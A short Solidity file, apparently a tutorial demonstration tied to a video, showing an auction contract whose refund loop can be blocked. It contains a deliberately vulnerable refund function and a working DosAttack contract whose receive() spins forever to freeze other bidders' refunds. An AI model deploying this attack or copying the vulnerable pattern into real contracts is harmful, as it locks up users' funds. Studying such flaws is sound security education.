// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

///https://www.youtube.com/watch?v=GVTZuuzCbIs

contract DosAuction {
    mapping(address => uint256) public bidders;
    address[] public allBidders;
    uint256 public refundProgress;

    function bid() external payable {
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }

    /* function refund() external {
        uint totalBid = 0;
        for (uint i = 0; i < allBidders.length; i++) {
            totalBid += bidders[allBidders[i]];
        }
        uint refundAmount = totalBid / 2;
        for (uint i = 0; i < allBidders.length; i++) {
            allBidders[i].transfer(refundAmount / allBidders.length);
        }
        refundProgress = 1;
    } */

    function refund() external {
        for (uint256 i = refundProgress; i < allBidders.length; i++) {
            address bidder = allBidders[i];

            (bool success, ) = bidder.call{value: bidders[bidder]}("");
            require(success, "failed to call");

            /*
                if (!success) {
                    failedRefunds.push(bidder);
                }
            */

            refundProgress++;
        }
    }
}

contract DosAttack {
    DosAuction auction;
    bool hack = true;
    address payable owner;

    constructor(address _auction) {
        auction = DosAuction(_auction);
        owner = payable(msg.sender);
    }

    function doBid() external payable {
        auction.bid{value: msg.value}();
    }

    function toggleHack() external {
        require(msg.sender == owner, "failed");
        hack = !hack;
    }

    receive() external payable {
        if (hack == true) {
            while (true) {}
        } else {
            owner.transfer(msg.value);
        }
    }
}
